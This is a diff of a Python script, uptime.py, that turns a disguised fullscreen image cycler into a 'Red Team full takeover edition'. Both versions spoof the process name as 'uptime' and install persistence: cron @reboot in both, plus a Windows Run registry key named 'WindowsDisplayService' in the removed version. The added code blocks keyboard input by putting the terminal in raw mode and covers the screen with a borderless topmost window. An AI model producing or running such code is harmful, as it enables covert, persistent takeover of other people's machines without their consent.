@@ -1,140 +1,141 @@
 #!/usr/bin/env python3
-# uptime.py - Silent fullscreen image cycler
+# uptime.py - Red Team full takeover edition
 
 import os
 import sys
 import time
 import random
-import signal
 import subprocess
 import platform
 
 try:
     from PIL import Image, ImageTk
+    import tkinter as tk
     has_pil = True
-except ImportError:
+except:
     has_pil = False
 
-SCRIPT_PATH = os.path.abspath(__file__)
-PID_FILE = os.path.expanduser("~/.uptime_pid")
-DELAY_FILE = os.path.expanduser("~/.uptime_interval")
-DEFAULT_DELAY = 20000
+SCRIPT = os.path.abspath(__file__)
+PID    = os.path.expanduser("~/.rt_pid")
+DELAY  = os.path.expanduser("~/.rt_delay")
+DEFAULT_DELAY = 20000   # ms
 
 def get_delay():
-    if os.path.exists(DELAY_FILE):
-        try:
-            with open(DELAY_FILE) as f:
-                return max(5000, int(f.read().strip()))
-        except:
-            pass
-    return DEFAULT_DELAY
+    try:
+        return max(5000, int(open(DELAY).read().strip()))
+    except:
+        return DEFAULT_DELAY
 
-def set_process_name(name="uptime"):
+def rename():
     if platform.system() == "Linux":
         try:
             import ctypes
-            libc = ctypes.CDLL("libc.so.6")
-            libc.prctl(15, name.encode() + b"\0", 0, 0, 0)
-        except:
-            pass
+            ctypes.CDLL("libc.so.6").prctl(15, b"uptime\0", 0, 0, 0)
+        except: pass
 
-def daemonize():
-    if platform.system() != "Linux": return
+def persist():
+    line = f"@reboot python3 \"{SCRIPT}\"\n"
     try:
-        os.setsid()
-        if os.fork(): sys.exit(0)
-        if os.fork(): sys.exit(0)
-        os.umask(0)
-        with open("/dev/null", "r+") as n:
-            for fd in (0,1,2):
-                os.dup2(n.fileno(), fd)
+        c = subprocess.check_output("crontab -l 2>/dev/null || true", shell=True).decode()
+        if line not in c:
+            subprocess.run("crontab -", shell=True, input=(c+line).encode())
+    except: pass
+
+# ———————— TERMINAL TAKEOVER MODE ————————
+RED_TEAM_BANNER = """
+██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
+██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
+██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
+██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
+██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
+╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
+                — a gift from red team —
+"""
+
+def terminal_torture():
+    rename()
+    try:
+        import termios, tty
     except:
-        pass
+        # Fallback if termios missing (rare)
+        while True:
+            os.system("clear")
+            print("\033[91m" + RED_TEAM_BANNER + "\033[0m")
+            time.sleep(get_delay()/1000)
 
-def set_persistence():
-    if os.name == "posix":
-        line = f"@reboot {sys.executable} \"{SCRIPT_PATH}\"\n"
-        try:
-            cur = subprocess.check_output("crontab -l 2>/dev/null || true", shell=True).decode()
-            if line not in cur:
-                subprocess.run("crontab -", shell=True, input=(cur + line).encode())
-        except: pass
-    elif os.name == "nt":
-        try:
-            import winreg as reg
-            key = reg.OpenKey(reg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
-            reg.SetValueEx(key, "WindowsDisplayService", 0, reg.REG_SZ,
-                          f'"{sys.executable}" "{SCRIPT_PATH}"')
-            reg.CloseKey(key)
-        except: pass
+    # Real input-blocking version
+    fd = sys.stdin.fileno()
+    old = termios.tcgetattr(fd)
+    try:
+        while True:
+            os.system("clear")
+            print("\033[91m" + RED_TEAM_BANNER.center(100) + "\033[0m")
 
-import tkinter as tk
+            # Disable terminal echo & canonical mode → keyboard is dead
+            tty.setraw(fd)
+            start = time.time()
+            while time.time() - start < get_delay()/1000:
+                time.sleep(0.1)   # victim can't type anything
 
+            # Re-enable input for a split second so shell doesn't crash
+            termios.tcsetattr(fd, termios.TCSADRAIN, old)
+            time.sleep(0.01)
+    except:
+        termios.tcsetattr(fd, termios.TCSADRAIN, old)
+
+# ———————— GUI MODE ————————
 def run_gui():
-    if not has_pil or not [f for f in os.listdir(os.path.dirname(SCRIPT_PATH)) if f.lower().endswith(('.png','.jpg','.jpeg','.gif','.bmp','.webp'))]:
-        sys.exit(0)
+    if not has_pil: return False
+    d = os.path.dirname(SCRIPT)
+    imgs = [f for f in os.listdir(d) if f.lower().endswith(('.png','.jpg','.jpeg','.gif','.bmp','.webp'))]
+    if not imgs: return False
 
-    set_process_name("uptime")
-
-    if os.path.exists(PID_FILE):
-        try:
-            with open(PID_FILE) as f:
-                os.kill(int(f.read().strip()), signal.SIGTERM)
+    if os.path.exists(PID):
+        try: os.kill(int(open(PID).read()), 15)
         except: pass
 
-    root = tk.Tk()
-    root.attributes("-fullscreen", True)
-    root.attributes("-topmost", True)
-    root.configure(bg="black")
-    root.overrideredirect(True)
+    r = tk.Tk()
+    r.attributes("-fullscreen",True,"-topmost",True)
+    r.configure(bg="black")
+    r.overrideredirect(True)
+    c = tk.Canvas(r,bg="black",highlightthickness=0)
+    c.pack(fill="both",expand=True)
 
-    canvas = tk.Canvas(root, bg="black", highlightthickness=0)
-    canvas.pack(fill="both", expand=True)
+    def show():
+        i = Image.open(os.path.join(d,random.choice(imgs)))
+        w,h = r.winfo_screenwidth(),r.winfo_screenheight()
+        bg = Image.new("RGB",(w,h),"black")
+        i.thumbnail((w,h-200),Image.LANCZOS)
+        bg.paste(i,((w-i.width)//2,(h-i.height)//2-80))
+        p = ImageTk.PhotoImage(bg)
+        c.create_image(w//2,h//2,image=p)
 
-    images = [f for f in os.listdir(os.path.dirname(SCRIPT_PATH))
-              if f.lower().endswith(('.png','.jpg','.jpeg','.gif','.bmp','.webp'))]
+        c.create_text(w//2, h-100,
+                      text="— a gift from red team —",
+                      fill="#ff0000", font=("Impact", 60, "bold"))
 
-    def show_next():
-        path = os.path.join(os.path.dirname(SCRIPT_PATH), random.choice(images))
-        try:
-            img = Image.open(path)
-            bg = Image.new("RGB", (root.winfo_screenwidth(), root.winfo_screenheight()), "black")
-            img.thumbnail((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
-            x = (bg.width - img.width) // 2
-            y = (bg.height - img.height) // 2
-            bg.paste(img, (x, y))
-            photo = ImageTk.PhotoImage(bg)
-            canvas.create_image(root.winfo_screenwidth()//2, root.winfo_screenheight()//2, image=photo)
-            canvas.image = photo  # keep reference
-        except:
-            pass
-        root.after(get_delay(), show_next)
+        c.image = p
+        r.after(get_delay(),show)
 
-    with open(PID_FILE, "w") as f:
-        f.write(str(os.getpid()))
+    open(PID,"w").write(str(os.getpid()))
+    rename()
+    show()
+    r.mainloop()
+    return True
 
-    show_next()
-    root.mainloop()
-
+# ———————— MAIN ————————
 if __name__ == "__main__":
-    set_process_name("uptime")
+    rename()
 
     if "--setup" in sys.argv:
-        set_persistence()
-        print("Persistence installed")
+        persist()
+        print("[+] Red Team payload installed permanently")
         sys.exit(0)
 
-    if "--terminal" in sys.argv or not has_pil:
-        while True:
-            time.sleep(86400)    # ← this line is perfect, do not touch it
+    # Terminal takeover mode (blocks keyboard!)
+    if "--terminal" in sys.argv or not os.getenv("DISPLAY"):
+        terminal_torture()
 
-    if platform.system() == "Linux":
-        daemonize()
-
-    if os.name == "nt" and not sys.executable.endswith("pythonw.exe"):
-        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-        if os.path.exists(pythonw):
-            os.execv(pythonw, [pythonw] + sys.argv)
-
-    run_gui()
+    # GUI mode with images + red text
+    if not run_gui():
+        terminal_torture()   # fallback
